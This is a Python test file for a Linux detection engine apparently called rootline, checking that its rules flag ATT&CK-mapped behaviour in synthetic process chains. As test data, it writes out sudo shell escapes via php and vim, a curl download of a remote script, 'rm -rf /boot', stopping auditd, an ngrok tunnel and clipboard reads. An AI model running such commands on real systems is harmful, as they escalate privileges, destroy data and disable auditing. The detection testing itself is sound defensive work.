from pathlib import Path

from conftest import rec

from rootline.detect import RULES_V01, detect
from rootline.loaders import load_records
from rootline.pipeline import analyze, build_graph

FX = Path(__file__).parent / "fixtures"


def _fired(records, rules=None):
    g, _ = build_graph(records)
    return {(a.rule_id, a.attack_technique) for a in detect(g, rules=rules)}


def _chain(*procs):
    """procs: (pid, path, argv) spawned as a parent->child chain under bash[1]."""
    out = [rec(0.5, "exec", 1, path="/bin/bash", argv=["bash"])]
    t, parent = 1.0, 1
    for pid, path, argv in procs:
        out.append(rec(t, "fork", parent, child_pid=pid))
        out.append(rec(t + 0.01, "exec", pid, ppid=parent, path=path, argv=argv))
        t, parent = t + 1, pid
    return out


def test_gtfobins_escape_real_fixture():
    recs = load_records(str(FX / "sysmon_t1548_find.log"))
    assert ("RL-008", "T1548.003") in _fired(recs)
    assert not any(r == "RL-008" for r, _ in _fired(recs, RULES_V01))  # v0.1 rules are blind to it


def test_gtfobins_versioned_interpreter_and_child_shell():
    fired = _fired(_chain((2, "/usr/bin/sudo", ["sudo", "php", "-r", "system('/bin/sh');"]),
                          (3, "/usr/bin/php7.2", ["php", "-r", "system('/bin/sh');"])))
    assert ("RL-008", "T1548.003") in fired
    fired = _fired(_chain((2, "/usr/bin/sudo", ["sudo", "vim"]), (3, "/usr/bin/vim", ["vim"]),
                          (4, "/bin/sh", ["sh"])))
    assert ("RL-008", "T1548.003") in fired
    # same binaries without sudo: nothing
    assert _fired(_chain((3, "/usr/bin/vim", ["vim"]), (4, "/bin/sh", ["sh"]))) == set()


def test_command_line_rules():
    cases = {
        ("RL-009", "T1140"): ("/usr/bin/base64", ["base64", "-d"]),
        ("RL-010", "T1105"): ("/usr/bin/curl", ["curl", "-sO", "https://example.org/x.sh"]),
        ("RL-011", "T1485"): ("/bin/rm", ["rm", "-rf", "/boot"]),
        ("RL-012", "T1562.001"): ("/bin/systemctl", ["systemctl", "stop", "auditd"]),
        ("RL-013", "T1572"): ("/tmp/ngrok", ["./ngrok", "http", "80"]),
        ("RL-014", "T1021.004"): ("/usr/bin/ssh", ["ssh", "-oBatchMode=yes", "root@10.0.0.1"]),
        ("RL-015", "T1115"): ("/usr/bin/xclip", ["xclip", "-o"]),
        ("RL-016", "T1068"): ("/usr/bin/pkexec", []),
    }
    for want, (path, argv) in cases.items():
        assert want in _fired(_chain((2, path, argv))), want


def test_benign_command_lines_stay_quiet():
    for path, argv in [("/usr/bin/base64", ["base64", "file"]), ("/bin/rm", ["rm", "-rf", "/tmp/build"]),
                       ("/usr/bin/curl", ["curl", "https://example.org"]), ("/bin/systemctl", ["systemctl", "stop", "nginx"]),
                       ("/usr/bin/ssh", ["ssh", "host"]), ("/usr/bin/pkexec", ["pkexec", "gparted"])]:
        assert _fired(_chain((2, path, argv))) == set(), argv


def test_lib_implant_and_discovery_burst():
    recs = [rec(1, "write", 9, comm="rkload", path="/usr/lib/libseconf/.ports"),
            rec(2, "write", 10, comm="dpkg", path="/usr/lib/x86_64-linux-gnu/libfoo.so")]
    assert _fired(recs) == {("RL-017", "T1574.006")}
    tools = ["uname", "id", "whoami", "hostname"]
    burst = [rec(0.5, "exec", 1, path="/bin/bash")]
    for i, t in enumerate(tools):
        burst += [rec(1 + i, "fork", 1, child_pid=10 + i), rec(1.01 + i, "exec", 10 + i, path=f"/usr/bin/{t}")]
    assert ("RL-018", "T1082") in _fired(burst)
    assert ("RL-018", "T1082") not in _fired(burst[:5])


def test_log4shell_alert_on_real_fixture():
    a = analyze(load_records(str(FX / "log4shell_sysmon.json")))
    assert any(x.rule_id == "RL-003" for x in a.alerts)
